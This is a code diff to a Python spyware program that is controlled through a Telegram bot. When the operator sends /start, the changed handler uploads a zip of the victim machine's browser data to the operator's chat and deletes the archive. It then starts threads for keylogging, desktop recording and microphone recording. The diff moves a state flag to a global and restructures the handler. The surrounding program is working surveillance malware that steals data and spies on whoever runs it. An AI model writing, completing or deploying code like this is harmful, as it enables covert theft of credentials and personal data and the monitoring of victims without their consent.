@@ -34,6 +34,7 @@ from threading import Thread
 Telegram = True    # Send data to telegram or not
 TOKEN = "TOKEN"    # TOKEN for bot
 MYID = 1  # your telegram id
+start_state = False
 
 
 def call_func():
@@ -71,36 +72,35 @@ def chat():
     """
     working with telegram chat
     """
-    start_state = False
+
     bot = telebot.TeleBot(TOKEN)  # creating a bot
 
     # send data and start capturing sound keyboard and desktop
     @bot.message_handler(commands=["start"])
     def start(m, res=False):
         global start_state
-        if start_state == False:
+        if not start_state:
             start_state = True
-            return
-        # checking for a specific user
-        if m.from_user.id == MYID:
-            # creating an archive and data from browsers
-            with open(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip", 'rb') as f:
-                bot.send_document(m.chat.id, f)
-                remove_func()
+            # checking for a specific user
+            if m.from_user.id == MYID:
+                # creating an archive and data from browsers
+                with open(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip", 'rb') as f:
+                    bot.send_document(m.chat.id, f)
+                    remove_func()
 
-            os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip")   # deleting a used archive
+                os.remove(fr"C:\System32\x25x02x42\{socket.gethostname()}.zip")   # deleting a used archive
 
-            th_keylog = Thread(target=key_log_start, daemon=True)  # keyboard capture
-            time.sleep(2)
-            th_video_cap = Thread(target=video_cap, daemon=True)   # desktop recording
-            th_sound_mic = Thread(target=sound_mic, daemon=True)   # sound recording
-            # starting threads
-            th_keylog.start()
-            th_video_cap.start()
-            th_sound_mic.start()
+                th_keylog = Thread(target=key_log_start, daemon=True)  # keyboard capture
+                time.sleep(2)
+                th_video_cap = Thread(target=video_cap, daemon=True)   # desktop recording
+                th_sound_mic = Thread(target=sound_mic, daemon=True)   # sound recording
+                # starting threads
+                th_keylog.start()
+                th_video_cap.start()
+                th_sound_mic.start()
 
-        else:
-            bot.send_message(m.chat.id, '?')
+            else:
+                bot.send_message(m.chat.id, '?')
 
     @bot.message_handler(commands=["screenshot"])
     def screenshot(m, res=False):
